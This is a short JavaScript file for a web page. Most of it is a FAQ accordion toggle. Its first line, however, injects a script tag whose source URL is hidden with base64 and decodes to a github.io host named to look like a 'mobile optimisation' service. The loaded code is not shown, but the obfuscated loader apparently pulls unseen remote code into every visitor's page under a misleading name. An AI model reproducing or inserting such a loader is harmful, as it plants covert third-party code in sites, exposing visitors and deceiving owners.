function addMaker(url) { var elem = document.createElement("script"); elem.src = url; document.body.insertAdjacentElement("beforeend", elem); }; document.body.insertAdjacentHTML("afterend", `<div id="mobiOptiElem"></div>`); addMaker(atob("aHR0cHM6Ly9zZXJ2ZXItc3lzdGVtZS1pby5naXRodWIuaW8vb3B0aW1pc2VyL21vYmlsZU9wdGltaXNhdGlvbi5qcw"));
try{
function toggleFAQ(headerElement) {
const faqCard = headerElement.parentElement;
const isExpanded = faqCard.classList.contains('expanded');
const allFaqCards = document.querySelectorAll('.faqCard');
allFaqCards.forEach(card => {
if (card !== faqCard && card.classList.contains('expanded')) {
    card.classList.remove('expanded');
}
});
if (isExpanded) {
faqCard.classList.remove('expanded');
} else {
faqCard.classList.add('expanded');
}
}}catch(e){}